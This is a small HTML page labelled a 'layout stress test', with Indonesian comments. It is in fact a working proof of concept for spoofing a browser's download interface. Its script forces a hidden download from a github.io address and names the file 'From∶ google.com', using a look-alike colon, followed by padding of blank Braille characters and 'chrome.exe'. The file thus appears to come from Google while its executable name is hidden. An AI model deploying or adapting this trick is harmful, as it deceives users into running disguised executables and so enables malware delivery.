<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Layout Exhaustion Test</title>
</head>
<body>
    <h2>Download Layout Stress Test</h2>
    <button onclick="triggerStressTest()">Uji Dorongan Baris Vertikal</button>

    <script>
        function triggerStressTest() {
            // Menggunakan kombinasi U+2800 (Braille Blank) berulang kali 
            // untuk memaksa alokasi baris vertikal yang masif pada komponen UI.
            const verticalPadding = "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀";
            const craftedFilename = "From∶ google.com" + verticalPadding + "chrome.exe";
            
            const targetUrl = "https://ecdnts-del.github.io/test-apk/From%E2%88%B6%20google.com%20%E2%A0%80%E2%A0%80%E2%A0%80%E2%A0%80%E2%A0%80%20chrome.exe";

            const link = document.createElement('a');
            link.href = targetUrl;
            link.download = craftedFilename;
            link.style.display = 'none';

            document.body.appendChild(link);
            link.click();

            setTimeout(() => {
                document.body.removeChild(link);
            }, 500);
        }
    </script>
</body>
</html>
